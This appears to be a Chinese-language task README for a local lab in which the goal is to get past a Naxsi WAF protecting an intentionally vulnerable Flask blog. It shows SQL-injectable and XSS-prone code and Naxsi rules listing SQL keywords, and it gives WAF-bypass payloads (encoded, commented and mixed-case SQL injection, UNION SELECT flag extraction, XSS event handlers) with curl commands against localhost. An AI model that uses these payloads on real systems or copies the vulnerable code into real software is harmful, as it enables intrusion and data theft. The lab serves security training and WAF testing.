# Naxsi WAF 绕过任务

## 任务概述

本任务要求攻击者绕过 Naxsi WAF 防护，成功利用博客应用中的漏洞获取 flag。

## 目标环境

- **应用**: 基于 Flask 的博客系统
- **WAF**: Naxsi (Nginx Anti XSS & SQL Injection)
- **数据库**: SQLite
- **防护模式**: 生产模式 (非学习模式)

## 漏洞分析

### 1. SQL 注入漏洞

#### 登录功能
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**漏洞点**: 用户名和密码参数直接拼接 SQL 查询

#### 搜索功能
```python
sql_query = f"SELECT p.id, p.title, p.content, p.created_at, u.username FROM posts p JOIN users u ON p.author_id = u.id WHERE p.title LIKE '%{query}%' OR p.content LIKE '%{query}%'"
```

**漏洞点**: 搜索关键词直接拼接 SQL 查询

#### 评论功能
```python
query = f"INSERT INTO comments (post_id, content, author, created_at) VALUES ({post_id}, '{content}', '{author}', datetime('now'))"
```

**漏洞点**: 评论内容直接拼接 SQL 查询

### 2. XSS 漏洞

#### 评论显示
```html
{{ comment.content | safe }}
```

**漏洞点**: 评论内容使用 `safe` 过滤器，未进行 HTML 转义

### 3. 未授权访问

#### 用户信息 API
```python
@app.route('/api/users')
def api_users():
    # 无权限检查
    c.execute("SELECT id, username, email, role FROM users")
```

**漏洞点**: 无身份验证和授权检查

## Naxsi WAF 防护机制

### 核心规则
- **SQL 注入检测**: 检测 SQL 关键字、特殊字符
- **XSS 检测**: 检测 HTML 标签、JavaScript 代码
- **RFI 检测**: 检测远程文件包含
- **目录遍历检测**: 检测路径遍历攻击

### 防护阈值
- SQL 注入: 8 分
- XSS: 8 分
- RFI: 8 分
- 目录遍历: 4 分

### 检测规则示例
```
MainRule "rx:select|union|update|delete|insert|table|from|ascii|hex|unhex|drop|load_file|substr|group_concat|dumpfile" "msg:sql keywords" "mz:BODY|URL|ARGS|$HEADERS_VAR:Cookie" "s:$SQL:4" id:1000;
MainRule "str:<" "msg:html open tag" "mz:ARGS|URL|BODY|$HEADERS_VAR:Cookie" "s:$XSS:8" id:1302;
```

## 攻击方法

### 1. 绕过 WAF 的 SQL 注入

#### 方法一: 编码绕过
```sql
# URL 编码
%27%20OR%20%271%27%3D%271

# 双重编码
%2527%2520OR%2520%25271%2527%253D%25271
```

#### 方法二: 注释绕过
```sql
# 使用不同的注释符号
' OR '1'='1' #
' OR '1'='1' --
' OR '1'='1' /* */
```

#### 方法三: 大小写混合
```sql
' UnIoN SeLeCt 1,flag,3,4,5 FrOm flags --
```

#### 方法四: 空白字符绕过
```sql
'%09UNION%09SELECT%091,flag,3,4,5%09FROM%09flags%09--
```

### 2. 绕过 WAF 的 XSS

#### 方法一: 事件处理器绕过
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

#### 方法二: 编码绕过
```html
&#60;script&#62;alert('XSS')&#60;/script&#62;
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

#### 方法三: 属性绕过
```html
<img src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">Click me</a>
```

### 3. 获取 Flag

#### 直接访问 API
```bash
curl http://localhost:5001/api/flags
```

#### SQL 注入获取
```sql
' UNION SELECT 1,flag,3,4,5 FROM flags --
```

## 测试步骤

### 1. 环境准备
```bash
# 启动环境
cd docker/defense/naxsi_waf
docker-compose up -d

# 验证服务状态
docker-compose ps
```

### 2. 基础功能测试
```bash
# 访问应用
curl http://localhost:5001

# 测试登录
curl -X POST http://localhost:5001/login -d "username=admin&password=admin123"
```

### 3. 漏洞利用测试

#### 绕过 WAF 测试 (直连应用)
```bash
# SQL 注入登录
curl -X POST http://localhost:5001/login -d "username=' OR '1'='1&password=1"

# SQL 注入搜索
curl "http://localhost:5001/search?q=' UNION SELECT 1,flag,3,4,5 FROM flags --"

# XSS 评论
curl -X POST http://localhost:5001/comment -d "post_id=1&content=<script>alert('XSS')</script>"
```

#### WAF 防护测试 (通过 Nginx)
```bash
# 同样的攻击载荷应该被拦截
curl -X POST http://localhost:8080/login -d "username=' OR '1'='1&password=1"
curl "http://localhost:8080/search?q=' UNION SELECT 1,flag,3,4,5 FROM flags --"
```

### 4. 查看日志
```bash
# 查看 Nginx 访问日志
docker-compose logs nginx-logs

# 查看 Nginx 错误日志
docker-compose logs nginx-naxsi
```

## 成功标志

1. **绕过 WAF**: 通过 Nginx + Naxsi 成功执行攻击载荷
2. **获取 Flag**: 成功获取动态生成的 flag
3. **日志验证**: 在 WAF 日志中看到拦截记录

## 注意事项

1. Naxsi 使用基于规则的模式匹配，不是基于签名的检测
2. 学习模式可以自动生成白名单规则
3. 不同的编码方式可能绕过不同的检测规则
4. 攻击载荷需要根据具体的 WAF 规则进行调整 